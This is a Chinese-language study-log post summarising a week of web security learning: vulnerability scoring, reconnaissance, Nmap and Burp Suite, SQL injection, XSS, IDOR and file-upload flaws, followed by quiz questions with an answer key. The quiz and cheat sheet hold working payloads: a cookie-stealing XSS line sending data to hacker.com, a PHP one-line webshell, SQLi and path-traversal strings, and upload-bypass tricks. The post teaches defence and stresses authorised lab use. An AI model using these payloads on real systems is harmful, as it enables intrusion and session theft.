---
title: Week 04：漏洞扫描与基线 - 周度总结
tags:
  - 学习总结
  - 阶段复盘
categories:
  - 网络安全
date: 2026-02-19
---

# Week 04：漏洞扫描与基线 - 周度总结

## 📅 本周学习概览

本周我们从“被动防御”转向了“主动防御”，甚至可以说半只脚踏入了“进攻”的大门。如果说前三周是在学习如何建造坚固的城墙（网络基础、加密协议、系统加固），那么这一周我们开始学习如何像黑客一样思考——寻找城墙上的裂缝。

我们深入研究了 **情报搜集** 的艺术，掌握了 **Nmap** 和 **Nessus** 这两把扫描利器，并亲手解剖了 **HTTP 协议**。更重要的是，我们直面了 Web 安全的“四大天王”：**SQL 注入**、**XSS**、**越权**和**文件上传**。这些不仅仅是攻击技术，更是理解现代应用架构脆弱性的关键钥匙。

<!--more-->

---

## 📚 每日核心知识回顾

### Day 022：漏洞类型与编号体系
- **CVE (身份证)**：每一个公开漏洞的唯一编号（如 `CVE-2021-44228`）。
- **CVSS (体检单)**：漏洞危害的量化评分（0-10分）。10.0 分意味着“核弹级”——无需权限、远程可利用、全面沦陷。
- **CWE (病历本)**：漏洞的类型分类（如 CWE-89 是 SQL 注入）。
- **核心逻辑**：看到 CVE 编号，第一时间查 CVSS 分数和利用条件（Exp 是否公开），决定修补优先级。

### Day 023：信息搜集 (OSINT)
- **被动搜集**：**不接触目标**。利用 Google Dorks (`site:`, `filetype:`), Whois, Shodan 搜集情报。这是最隐蔽的侦察。
- **主动搜集**：**接触目标**。DNS 挖掘子域名 (`dig`), 端口扫描。这是攻击的前奏。
- **攻击面**：主站通常防御森严，但测试环境（`dev.example.com`）、老旧系统、GitHub 上泄露的密钥往往是突破口。

### Day 024：主动扫描工具实战
- **Nmap (诸神之眼)**：
  - `-sS`：半连接扫描（隐蔽、快）。
  - `-sV`：服务版本探测（查 Banner）。
  - `--script`：调用 NSE 脚本进行漏洞探测。
- **Nessus (自动化体检)**：企业级漏扫工具。它能发现已知版本漏洞，但对逻辑漏洞（如越权）无能为力。
- **误报与漏报**：扫描器不是万能的，必须结合人工验证。

### Day 025：Web 架构与 HTTP 协议
- **HTTP 本质**：无状态的请求-响应模型。
- **Burp Suite (中间人神器)**：
  - **Proxy**：拦截并修改数据包（改参数）。
  - **Repeater**：重放请求（测试注入）。
  - **Intruder**：自动化爆破（撞库）。
- **状态码**：`200` (成功), `301/302` (跳转), `403` (禁止), `404` (未找到), `500` (服务器炸了)。

### Day 026：常见 Web 漏洞 (1) - 注入与脚本
- **SQL 注入 (SQLi)**：
  - **原理**：拼接字符串导致数据变代码。
  - **Payload**：`' or 1=1 --` (万能钥匙)。
  - **防御**：**预编译 (Prepared Statements)** 是唯一正解。
- **XSS (跨站脚本)**：
  - **原理**：恶意 JS 代码在受害者浏览器执行。
  - **危害**：盗取 Cookie (Session Hijacking)。
  - **防御**：**HTML 实体编码** (把 `<` 变 `&lt;`)。

### Day 027：常见 Web 漏洞 (2) - 逻辑与配置
- **越权 (IDOR)**：把 `id=100` 改成 `id=101` 就能看别人的数据。这是由于后端缺乏对象级别的权限校验。
- **文件上传**：上传 `.php` 文件（WebShell）并让服务器解析执行。这是直接获取服务器权限 (GetShell) 的最快路径。
- **暴力破解**：弱口令（`admin/123456`）永远是企业安全最大的短板。

### Day 028：周综合实验 (DVWA)
- **实战串联**：从信息搜集 -> 扫描发现 -> 漏洞利用 -> 获取权限。
- **攻防思维**：攻击不是目的，理解攻击是为了更好地防御。每一个 Payload 背后都对应着一种防御缺失。

---

## 🗺️ 知识图谱

### 本周内容在整体知识体系中的位置

```
网络安全学习路径
├── 第 1-3 周：基础夯实 (网络/协议/系统)
├── 第 4 周：漏洞扫描与基线 (Web 安全入门)  <-- We are here
│   ├── 理论基础：CVE, CVSS, HTTP 协议
│   ├── 侦察阶段：OSINT, Nmap, Nessus
│   ├── 武器阶段：Burp Suite
│   └── 漏洞实战：
│       ├── 注入类：SQLi (数据泄露)
│       ├── 客户端类：XSS (身份窃取)
│       ├── 逻辑类：IDOR, 弱口令 (权限绕过)
│       └── 权限类：文件上传 (服务器失陷)
└── 后续衔接
    └── 第 5 周：渗透测试方法论 (PTES) 与报告编写
```

### 本周关键词

`CVE` · `OSINT` · `Nmap` · `Burp Suite` · `SQL注入` · `XSS` · `WebShell`

---

## 📝 巩固练习题 (Level 4)

完成以下题目来检验你对第四周内容的掌握程度。

### 一、 概念速查（单选/简答）

1.  **关于 CVSS 评分，以下说法正确的是？**
    A) 分数越低越危险
    B) 只要是高危漏洞，就一定有现成的利用脚本
    C) `AV:N` (Attack Vector: Network) 代表漏洞可以远程利用
    D) CVSS 分数一旦发布就永远不会变

2.  **在使用 Nmap 进行全端口扫描时，应该加什么参数？**
    A) `-p 80`
    B) `-p-`
    C) `-F` (Fast scan)
    D) `-sn` (No port scan)

3.  **HTTP 状态码 `302 Found` 通常用于什么场景？**
    A) 网页永久移除
    B) 权限不足，禁止访问
    C) 登录成功后跳转到首页
    D) 服务器内部错误

4.  **防御 SQL 注入的最佳实践是？**
    A) 使用 WAF 拦截
    B) 在前端用 JS 过滤特殊字符
    C) 后端使用预编译语句 (Prepared Statements)
    D) 数据库账户使用 root 权限

5.  **Burp Suite 中，哪个模块用于将一个请求包发送多次，方便手动调整参数进行测试？**
    A) Proxy
    B) Intruder
    C) Repeater
    D) Decoder

### 二、 场景分析（实战模拟）

6.  **场景：逻辑漏洞挖掘**
    你正在测试一个修改密码的接口：`POST /api/changepwd`，参数是 `username=admin&newpass=123456`。
    *   这个接口存在什么显而易见的逻辑漏洞风险？
    *   如果你把 `username` 改成别人的名字，会发生什么？
    *   如何修复这个漏洞？（提示：Session）

7.  **场景：XSS 盲打**
    你在一个反馈意见箱里提交了一段 XSS 代码：`<script>document.write('<img src="http://hacker.com/'+document.cookie+'"/>')</script>`。三天后，你在自己的服务器日志里看到了来自管理员后台 IP 的访问记录，URL 里带着一串 Session ID。
    *   这是哪种类型的 XSS？（反射/存储/DOM）
    *   你获取到了什么？有什么用？
    *   接下来你可以做什么？

8.  **场景：文件上传绕过**
    目标网站只允许上传 `.jpg` 图片。你有一个 `shell.php` 想上传。
    *   你可以尝试哪些绕过手段？（列举 2 种）
    *   如果服务器配置了 Nginx 解析漏洞，上传 `shell.jpg` 会发生什么？

### 三、 深度思考

9.  **为什么说“渗透测试”和“黑客攻击”在技术上几乎没有区别？它们的本质区别在哪里？**
    *   提示：关键词是“授权”、“目的”、“结果”。

---

## 🔑 参考答案

### 一、 概念速查
1.  **C**。`AV:N` 意味着通过网络即可攻击，威胁最大。
2.  **B**。`-p-` 表示扫描 1-65535 全端口。
3.  **C**。302 是临时重定向，常用于登录跳转。
4.  **C**。预编译将数据和代码彻底分离，从根源解决注入。
5.  **C**。Repeater (重放器) 是手动测试的核心。

### 二、 场景分析
6.  **越权/账号劫持**。
    *   风险：接口盲目信任了客户端提交的 `username`，而不是从服务器端的 Session 中获取当前登录用户。
    *   后果：攻击者可以随意重置任意用户的密码。
    *   修复：后端应忽略请求中的 `username`，直接 `UPDATE users SET pass=? WHERE id=current_session_user_id`。
7.  **存储型 XSS**。
    *   类型：代码被存入数据库，管理员查看反馈时触发，是**存储型**。
    *   获取：拿到了管理员的 Cookie (Session ID)。
    *   后果：可以伪造管理员身份登录后台，接管系统。
8.  **上传绕过**。
    *   手段：
        1.  **MIME 修改**：抓包把 `Content-Type: application/php` 改为 `image/jpeg`。
        2.  **双后缀/截断**：`shell.php.jpg` 或 `shell.php%00.jpg`。
    *   解析漏洞：如果服务器配置错误，把 `.jpg` 当 php 执行，那么上传图片也能 GetShell。

### 三、 深度思考
9.  **本质区别在于“授权”**。
    *   **渗透测试**：拥有书面授权，在约定范围内测试，目的是发现漏洞并帮助修复，最终提交报告。
    *   **黑客攻击**：未经授权，目的是破坏、窃取或勒索，最终导致损失。
    *   **技术上**：两者使用的工具（Nmap, Burp, Metasploit）和手法（注入, 钓鱼）是一模一样的。所以安全人员必须具备黑客思维，才能防住黑客。

---

## ✅ 评估标准（达成判定）

请对照以下标准检查你的学习成果：

- [ ] **理论**：能清晰解释 CVE、SQL 注入、XSS 的基本概念。
- [ ] **工具**：能熟练使用 Nmap 扫描端口，使用 Burp Suite 拦截并修改请求。
- [ ] **实战**：能在 DVWA Low 级别下成功复现 SQL 注入和 XSS 弹窗。
- [ ] **防御**：知道针对每种漏洞至少一种有效的防御手段（如预编译、HTML 编码）。

### 学习进度自评

| 评估项目 | 1-5 星 | 备注 |
|----------|--------|------|
| 漏洞理解 | ⭐⭐⭐⭐⭐ | 是否理解了“数据变代码”的本质？ |
| 工具熟练度 | ⭐⭐⭐⭐⭐ | Burp Suite 用得顺手吗？ |
| 实战能力 | ⭐⭐⭐⭐⭐ | 能独立完成 DVWA 练习吗？ |
| 安全意识 | ⭐⭐⭐⭐⭐ | 看到 URL 参数是否会下意识想测试注入？ |

---

## 💡 知识卡片速查

### 核心 Payload 速记

| 漏洞 | Payload / 关键特征 | 作用 |
|------|-------------------|------|
| **SQLi** | `' or 1=1 --` | 绕过登录验证 |
| **SQLi** | `' UNION SELECT 1,user(),3 --` | 联合查询，泄露数据 |
| **XSS** | `<script>alert(1)</script>` | 验证 XSS 是否存在 |
| **XSS** | `<img src=x onerror=alert(1)>` | 绕过 script 标签过滤 |
| **WebShell** | `<?php @eval($_POST['cmd']); ?>` | 一句话木马 |
| **LFI** | `../../../../etc/passwd` | 目录遍历/本地文件包含 |

### 常用命令速查

| 工具 | 命令 | 说明 |
|------|------|------|
| **Nmap** | `nmap -sS -sV -p- <ip>` | 全端口服务版本扫描 |
| **Nmap** | `nmap --script=vuln <ip>` | 常用漏洞脚本扫描 |
| **Dirsearch** | `python3 dirsearch.py -u <url>` | 扫描网站后台目录 |
| **SQLMap** | `sqlmap -u <url> --dbs` | 自动测试 SQL 注入 |

---

## 🚀 下一步学习预告

**下周主题**：Week 05 - 渗透测试方法论与报告编写

**学习重点**：
- **PTES 标准**：渗透测试执行标准，从交互阶段到汇报阶段的完整流程。
- **报告编写**：如何写一份老板看得懂（风险评估）、开发愿意改（修复建议）的专业报告。
- **法律法规**：网络安全法，什么能做，什么绝对不能做（红线）。

**本周学习为下周做铺垫**：
- 本周你掌握了“术”（技术），下周我们将学习“道”（方法论和规范），让你从“脚本小子”进化为“职业安全服务工程师”。

---

> 💬 **学习提示**：
> 1. 本周内容实战性极强，请务必多花时间在 DVWA 靶场上。
> 2. 不要只满足于利用漏洞，一定要去查看靶场的源码 (`view source`)，理解漏洞产生的根本原因。
> 3. **严守法律底线**：所有攻击技术仅限用于本地靶场或拥有书面授权的目标。

```bash
git add daily/Week4.md
git commit -m "Week4: 完成第四周漏洞扫描与基线学习总结"
```
